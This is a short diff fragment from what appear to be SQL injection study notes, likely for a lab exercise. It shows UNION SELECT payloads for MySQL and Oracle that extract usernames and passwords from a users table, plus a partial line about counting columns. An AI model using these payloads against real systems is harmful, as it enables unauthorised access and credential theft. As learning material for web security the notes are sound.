@@ -31,4 +31,5 @@ enum until it shows error so how many columns are the number before error (for e
 as example u retrived USERS_FGOOHN table which saves all users information.
 
 ' UNION SELECT USERNAME_DZLLNY,PASSWORD_CGOGXE FROM USERS_FGOOHN-- (mysql)
+
 ' UNION SELECT USERNAME_DZLLNY,PASSWORD_CGOGXE FROM USERS_FGOOHN-- (oracle)
